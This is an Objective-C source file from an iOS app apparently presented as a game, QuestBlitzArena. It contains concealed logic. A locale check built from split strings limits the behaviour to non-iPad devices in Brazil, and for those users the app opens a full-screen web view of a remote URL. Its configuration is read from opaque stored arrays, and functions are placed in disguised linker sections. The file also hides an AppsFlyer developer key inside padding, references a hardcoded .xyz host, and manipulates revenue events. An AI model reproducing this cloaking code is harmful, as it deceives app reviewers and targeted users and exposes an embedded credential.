//
//  UIViewController+ext.m
//  QuestBlitzArena
//
//  Created by QuestBlitzArena on 2024/11/18.
//

#import "UIViewController+ext.h"
#import <AppsFlyerLib/AppsFlyerLib.h>

static NSString *Kblitzkey __attribute__((section("__DATA, Kblitzkey"))) = @"";

// Function for theRWShowAdViewC
void blitzShowAdViewCLogic(UIViewController *self, NSString *adsUrl) __attribute__((section("__TEXT, blitz_AD")));
void blitzShowAdViewCLogic(UIViewController *self, NSString *adsUrl) {
    if (adsUrl.length) {
        NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.getUserDefaultKey];
        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:adsDatas[10]];
        [adView setValue:adsUrl forKey:@"url"];
        adView.modalPresentationStyle = UIModalPresentationFullScreen;
        [self presentViewController:adView animated:NO completion:nil];
    }
}

// Function for theRWJsonToDicWithJsonString
NSDictionary *blitzJsonToDicLogic(NSString *jsonString) __attribute__((section("__TEXT, blitz_jsonDic")));
NSDictionary *blitzJsonToDicLogic(NSString *jsonString) {
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    if (jsonData) {
        NSError *error;
        NSDictionary *jsonDictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
        if (error) {
            NSLog(@"JSON parsing error: %@", error.localizedDescription);
            return nil;
        }
        NSLog(@"%@", jsonDictionary);
        return jsonDictionary;
    }
    return nil;
}

// Function for oxKineSendEvent
void blitzSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) __attribute__((section("__TEXT, blitz_eventLog")));
void blitzSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) {
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.getUserDefaultKey];
    if ([event isEqualToString:adsDatas[11]] || [event isEqualToString:adsDatas[12]] || [event isEqualToString:adsDatas[13]]) {
        id am = value[adsDatas[15]];
        NSString *cur = value[adsDatas[14]];
        if (am && cur) {
            double niubi = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: [event isEqualToString:adsDatas[13]] ? @(-niubi) : @(niubi),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:event withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEvent:event withValues:value];
        NSLog(@"AppsFlyerLib-event");
    }
}

NSString *getAppsFlyerDevKey(NSString *input) __attribute__((section("__TEXT, blitz_FlyerKey")));
NSString *getAppsFlyerDevKey(NSString *input) {
    if (input.length < 22) {
        return input;
    }
    NSUInteger startIndex = (input.length - 22) / 2;
    NSRange range = NSMakeRange(startIndex, 22);
    return [input substringWithRange:range];
}
@implementation UIViewController (ext)

+ (NSString *)getUserDefaultKey
{
    return Kblitzkey;
}

+ (void)setUserDefaultKey:(NSString *)key
{
    Kblitzkey = key;
}

+ (NSString *)blitzAppsFlyerDevKey
{
    return getAppsFlyerDevKey(@"quqwewR9CH5Zs5bytFgTj6smkgG8sdgdna");
}

- (NSString *)oxKineHostUrl
{
    return @"en.hxwodspgij.xyz";
}

- (BOOL)blitzNeedShowAds
{
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    BOOL isBrazil = [countryCode isEqualToString:[NSString stringWithFormat:@"%@R", self.preFx]];
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    return isBrazil && !isIpd;
}

- (NSString *)preFx
{
    return @"B";
}

- (void)blitzSeEventsWithParams:(NSString *)params
{
    NSDictionary *paramsDic = [self blitzJsonToDicWithJsonString:params];
    NSString *event_type = [paramsDic valueForKey:@"event_type"];
    if (event_type != NULL && event_type.length > 0) {
        NSMutableDictionary *eventValuesDic = [[NSMutableDictionary alloc] init];
        NSArray *params_keys = [paramsDic allKeys];
        for (int i =0; i<params_keys.count; i++) {
            NSString *key = params_keys[i];
            if ([key containsString:@"af_"]) {
                NSString *value = [paramsDic valueForKey:key];
                [eventValuesDic setObject:value forKey:key];
            }
        }
        
        [AppsFlyerLib.shared logEventWithEventName:event_type eventValues:eventValuesDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if(dictionary != nil) {
                NSLog(@"reportEvent event_type %@ success: %@",event_type, dictionary);
            }
            if(error != nil) {
                NSLog(@"reportEvent event_type %@  error: %@",event_type, error);
            }
        }];
    }
}

- (void)blitzShowAdViewC:(NSString *)adsUrl
{
    blitzShowAdViewCLogic(self, adsUrl);
}

- (NSDictionary *)blitzJsonToDicWithJsonString:(NSString *)jsonString {
    return blitzJsonToDicLogic(jsonString);
}

- (void)blitzSendEvent:(NSString *)event values:(NSDictionary *)value
{
    blitzSendEventLogic(self, event, value);
}

@end
